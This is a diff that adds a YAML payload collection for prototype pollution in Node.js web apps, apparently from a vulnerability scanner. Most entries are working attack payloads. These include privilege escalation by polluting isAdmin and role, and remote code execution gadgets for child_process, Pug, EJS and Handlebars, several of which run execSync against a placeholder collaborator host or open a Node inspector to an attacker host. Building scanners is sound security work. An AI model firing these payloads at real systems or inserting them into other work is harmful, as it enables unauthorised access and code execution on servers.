@@ -1,0 +1,229 @@
+defaults:
+  vuln_type: prototype_pollution
+  runtime: node
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # ============================================================
+  # __proto__ pollution — JSON merge (basic)
+  # ============================================================
+  - technique: proto_assignment
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 2
+    payload: '{"__proto__": {"polluted": "ensphere-pp-probe"}}'
+    notes: "Basic __proto__ pollution probe. If a subsequent response includes 'polluted' key with value 'ensphere-pp-probe', the merge is unsafe."
+    tags: [probe, detection, proto, merge]
+
+  - technique: json_merge
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 2
+    payload: '{"__proto__": {"toString": "ensphere-pp-tostring"}}'
+    notes: "Pollute Object.prototype.toString. Breaks string coercion globally; objects return the injected value instead of [object Object]."
+    tags: [probe, toString, coercion, proto]
+
+  - technique: json_merge
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 2
+    payload: '{"__proto__": {"valueOf": 1}}'
+    notes: "Pollute Object.prototype.valueOf. Breaks numeric coercion; comparisons and arithmetic on plain objects produce unexpected results."
+    tags: [probe, valueOf, coercion, proto]
+
+  # ============================================================
+  # __proto__ pollution — nested levels
+  # ============================================================
+  - technique: json_merge
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: '{"a": {"__proto__": {"polluted": "ensphere-pp-nested1"}}}'
+    notes: "Single-level nested __proto__. Tests recursive merge functions that descend into child objects before hitting __proto__."
+    tags: [nested, depth_1, proto, merge]
+
+  - technique: json_merge
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: '{"a": {"b": {"__proto__": {"polluted": "ensphere-pp-nested2"}}}}'
+    notes: "Two-level nested __proto__. Deeper nesting evades shallow sanitisation that only checks top-level keys."
+    tags: [nested, depth_2, proto, merge]
+
+  - technique: json_merge
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: '{"x": {"y": {"z": {"__proto__": {"polluted": "ensphere-pp-nested3"}}}}}'
+    notes: "Three-level nested __proto__. Targets deeply recursive merge utilities such as lodash defaultsDeep."
+    tags: [nested, depth_3, proto, merge, lodash]
+
+  # ============================================================
+  # constructor.prototype pollution
+  # ============================================================
+  - technique: constructor_pollution
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: '{"constructor": {"prototype": {"polluted": "ensphere-pp-ctor"}}}'
+    notes: "Pollution via constructor.prototype path. Bypasses filters that block __proto__ but not the constructor chain."
+    tags: [constructor, prototype, bypass, merge]
+
+  - technique: constructor_pollution
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "constructor[prototype][polluted]=ensphere-pp-query"
+    notes: "constructor.prototype pollution via query string bracket notation. Express qs parser builds nested objects from bracket syntax."
+    tags: [constructor, prototype, query, express, qs]
+
+  # ============================================================
+  # Query parameter __proto__ injection
+  # ============================================================
+  - technique: proto_assignment
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "__proto__[polluted]=ensphere-pp-qproto"
+    notes: "Direct __proto__ pollution via query parameter. Express qs (extended mode) parses bracket notation into nested objects including __proto__."
+    tags: [query, proto, qs, express]
+
+  - technique: proto_assignment
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "__proto__.polluted=ensphere-pp-dot"
+    notes: "Dot-notation __proto__ pollution via query parameter. Works with parsers that expand dot paths into nested objects (e.g., qs with allowDots)."
+    tags: [query, proto, dot_notation, qs]
+
+  # ============================================================
+  # Privilege escalation via prototype
+  # ============================================================
+  - technique: proto_assignment
+    injection_surface: json_body
+    evidence_type: response_diff
+    risk: 4
+    payload: '{"__proto__": {"isAdmin": true}}'
+    notes: "Escalate privileges by polluting isAdmin. If authorization checks read obj.isAdmin and the property is missing, it falls through to the polluted prototype."
+    tags: [privesc, isAdmin, authz_bypass, proto]
+
+  - technique: proto_assignment
+    injection_surface: json_body
+    evidence_type: response_diff
+    risk: 4
+    payload: '{"__proto__": {"role": "admin"}}'
+    notes: "Escalate privileges by polluting role. Targets apps that check user.role and default to Object.prototype when the property is undefined."
+    tags: [privesc, role, authz_bypass, proto]
+
+  - technique: constructor_pollution
+    injection_surface: json_body
+    evidence_type: response_diff
+    risk: 4
+    payload: '{"constructor": {"prototype": {"isAdmin": true, "role": "admin"}}}'
+    notes: "Combined isAdmin + role escalation via constructor.prototype. Bypasses __proto__ keyword filters while achieving the same privilege escalation."
+    tags: [privesc, isAdmin, role, constructor, bypass]
+
+  # ============================================================
+  # RCE gadgets — child_process spawn
+  # ============================================================
+  - technique: proto_assignment
+    injection_surface: json_body
+    evidence_type: dns_hit
+    risk: 4
+    payload: '{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require(\"child_process\").execSync(\"nslookup COLLAB_DOMAIN\").toString())//", "NODE_OPTIONS": "--require /proc/self/cmdline"}}'
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Pollute shell/argv0/NODE_OPTIONS to achieve RCE when child_process.spawn or fork is called without explicit env. Requires Linux /proc filesystem."
+    tags: [rce, child_process, spawn, env, linux]
+
+  - technique: proto_assignment
+    injection_surface: json_body
+    evidence_type: dns_hit
+    risk: 4
+    payload: '{"__proto__": {"shell": true, "NODE_OPTIONS": "--inspect=COLLAB_HOST:9229"}}'
+    placeholders: [COLLAB_HOST]
+    notes: "Pollute NODE_OPTIONS to enable Node inspector on attacker-controlled host. When a child process spawns, it opens a debug port allowing full RCE."
+    tags: [rce, child_process, node_options, inspect]
+
+  # ============================================================
+  # Template engine gadgets — Handlebars
+  # ============================================================
+  - technique: proto_assignment
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 4
+    payload: '{"__proto__": {"pendingContent": "<script>alert(1)</script>"}}'
+    notes: "Handlebars gadget. Polluting pendingContent injects raw HTML into the compiled template output, bypassing Handlebars escaping."
+    tags: [rce, handlebars, template, xss, gadget]
+
+  # ============================================================
+  # Template engine gadgets — Pug
+  # ============================================================
+  - technique: proto_assignment
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 4
+    payload: '{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require(\"child_process\").execSync(\"id\")"}}}'
+    notes: "Pug template engine gadget. Injects a code block into the AST via prototype pollution. When the template is compiled, the injected code executes."
+    tags: [rce, pug, template, ast_injection, gadget]
+
+  # ============================================================
+  # Template engine gadgets — EJS
+  # ============================================================
+  - technique: proto_assignment
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 4
+    payload: '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"nslookup COLLAB_DOMAIN\");var y"}}'
+    placeholders: [COLLAB_DOMAIN]
+    notes: "EJS RCE gadget via outputFunctionName pollution. EJS uses this option unsafely in compiled template code, allowing arbitrary JS injection."
+    tags: [rce, ejs, template, outputFunctionName, gadget]
+
+  # ============================================================
+  # Express / Lodash specific gadgets
+  # ============================================================
+  - technique: json_merge
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 3
+    payload: '{"__proto__": {"status": 510}}'
+    notes: "Pollute default HTTP status code. Express res.status() may pick up the polluted value if status is read from a merged options object."
+    tags: [express, status, dos, proto]
+
+  - technique: json_merge
+    injection_surface: json_body
+    evidence_type: header_match
+    risk: 3
+    payload: '{"__proto__": {"content-type": "text/html"}}'
+    notes: "Pollute default Content-Type header. If Express or middleware reads content-type from a merged config, responses may be served as HTML, enabling XSS."
+    tags: [express, content_type, header, xss, proto]
+
+  # ============================================================
+  # JSON.parse with __proto__
+  # ============================================================
+  - technique: json_merge
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: '{"__proto__": {"json_parsed": true}}'
+    notes: "JSON.parse preserves __proto__ as a plain key. Pollution occurs when the parsed result is passed to an unsafe merge or assign utility that walks all keys including __proto__."
+    tags: [json_parse, merge, proto, detection]
+
+  # ============================================================
+  # Recursive merge gadgets
+  # ============================================================
+  - technique: json_merge
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: '{"__proto__": {"polluted": "ensphere-pp-merge"}, "constructor": {"prototype": {"polluted2": "ensphere-pp-merge2"}}}'
+    notes: "Dual-path pollution probe. Tests both __proto__ and constructor.prototype in one request. If either path survives sanitisation the prototype is polluted."
+    tags: [merge, dual_path, proto, constructor, probe]
+
+  - technique: json_merge
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: '{"__proto__": {"__proto__": {"deep_polluted": "ensphere-pp-double"}}}'
+    notes: "Double __proto__ nesting. Targets merge functions that strip one layer of __proto__ but not a second, allowing the inner key to pollute Object.prototype."
+    tags: [merge, double_proto, evasion, proto]
